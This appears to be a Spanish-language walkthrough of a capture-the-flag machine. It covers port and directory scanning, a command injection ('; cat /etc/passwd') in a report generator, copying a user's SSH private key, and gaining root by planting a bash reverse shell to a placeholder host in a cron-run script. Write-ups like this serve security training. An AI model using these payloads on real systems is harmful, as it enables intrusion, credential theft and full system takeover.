1- Ping y NMAP

<img width="618" height="390" alt="image" src="https://github.com/user-attachments/assets/d9c640a7-fb6e-4693-b6a2-6acdd489612e" />

2- Gobuster para ver directorios.

<img width="752" height="398" alt="image" src="https://github.com/user-attachments/assets/fe044eff-e140-41a8-9923-6304034c7265" />

3- Vemos un directorio donde se pueden subir archivos, intento subir una revshell pero no funciona. Asi que intento otra forma:

<img width="1233" height="575" alt="image" src="https://github.com/user-attachments/assets/ba9ba1c4-588f-4dcc-9c10-53fafb00897b" />

Hay un generador de reportes que genera archivos txt, es vulnerable a comandos: ; cat /etc/passwd y vemos que hay un usuario llamado samara:

<img width="605" height="113" alt="image" src="https://github.com/user-attachments/assets/fd75cb3d-e1d9-468d-812a-9103597e6d12" />

Hacemos un ls -a, a su directorio y vemos que hay una carpeta .ssh:

<img width="514" height="249" alt="image" src="https://github.com/user-attachments/assets/c26b8fde-aa27-4d26-9614-5c30782c28c6" />

Dentro de esa carpeta hay su id_rsa personal, lo copiamos y lo pegamos en un fichero txt :

<img width="541" height="585" alt="image" src="https://github.com/user-attachments/assets/6b385aa0-b6d2-4f41-8302-df3c724abe87" />


<img width="133" height="51" alt="image" src="https://github.com/user-attachments/assets/63e706f8-14da-4827-8ff3-a31f42df46dc" />

Una vez creado le damos permisos y conectamos via ssh.

<img width="499" height="231" alt="image" src="https://github.com/user-attachments/assets/4cde6de0-12d4-407e-ad32-ba07068c4ea2" />

Intentamos ver permisos y no vemos nada. Vemos lo que se esta ejecutando y hay un fichero sospechoso.

<img width="301" height="133" alt="image" src="https://github.com/user-attachments/assets/f627b9db-2e10-4efc-b8b0-49e646c85387" />

Es una contraseña, pero no le encuentro utilidad.

<img width="753" height="412" alt="image" src="https://github.com/user-attachments/assets/2a995cb2-3e00-43a1-b349-302d5976b49a" />

Vemos que hay un fichero que se ejecuta constantemente , lo modificamos y le ponemos una revshell, y nos ponemos en escucha:

<img width="753" height="412" alt="image" src="https://github.com/user-attachments/assets/fbe33e9c-20e7-47b3-963d-672b3b9fbd38" />

#!/bin/bash       
bash -i >& /dev/tcp/TUIP/1234 0>&1      
echo "No tienes permitido estar aqui :(." > /home/samara/message.txt      

Guardamos y salimos.

y automaticamente nos llega la shell como root directamente.
